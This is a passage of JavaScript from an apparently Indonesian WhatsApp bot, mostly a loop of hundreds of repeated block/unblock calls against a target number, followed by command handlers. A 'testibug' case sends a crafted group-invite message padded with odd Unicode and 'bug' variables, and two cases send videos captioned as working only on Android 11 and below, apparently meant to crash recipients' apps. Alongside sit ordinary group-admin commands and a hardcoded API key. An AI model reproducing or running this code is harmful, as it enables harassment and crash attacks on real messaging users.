await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
}
break
case 'testibug':{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573@g.us",
"inviteCode": "iy20uP5dbnx+xH64",
"inviteExpiration": `1688825781`,
"inviteTime":"1688566586000",
"expired":"0",
"groupType":"0",
"groupName": `༐༑⿻ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⿻༔༐༑${cttl}`,
"caption": `༐༑⿻𝐒⸙𝐀࿈𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑${bugui}`,
"jpegThumbnail": kosongjpg,
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'Classic': {
if (!isCreator) return m.reply(`*Only Premium Members Are Allowed To Use This Command*`)
await loading()
joauu = fs.readFileSync('./zetszet/video/hwmods.mp4')
zetsubo.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
}
break
//=================================================//
case 'goyang': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading() //Variable yg tadi
joauuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
zetsubo.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
}
break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
await loading()
let response = await zetsubo.groupInviteCode(from)
zetsubo.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'resetlinkgc':
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
await loading()
zetsubo.groupRevokeInvite(from)
break
//=================================================//
case 'sendlinkgc': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await zetsubo.groupInviteCode(from)
zetsubo.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
//=================================================//
case 'kick': {
if (!isCreator) return reply('*Premium Only*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zetsubo.groupParticipantsUpdate(from, [users], 'remove')
}
break
//=================================================//
case 'add': {
if (!isCreator) return reply('*Premium Only*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zetsubo.groupParticipantsUpdate(from, [users], 'add')
}
break
//=================================================//
case 'promote': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zetsubo.groupParticipantsUpdate(from, [users], 'promote')
}
break
//=================================================//
case 'demote': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zetsubo.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
await loading()
zetsubo.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//=================================================//
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp':
if (isBan) return reply('*Lu Di Ban Owner*')
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Znxn Xyz`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikallgans&text=${ini_txt}`)
zetsubo.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break
//=================================================
case 'editgroup': {   
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
if (args[0] === 'close'){
await zetsubo.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await zetsubo.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
//=================================================//
case 'editinfo': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
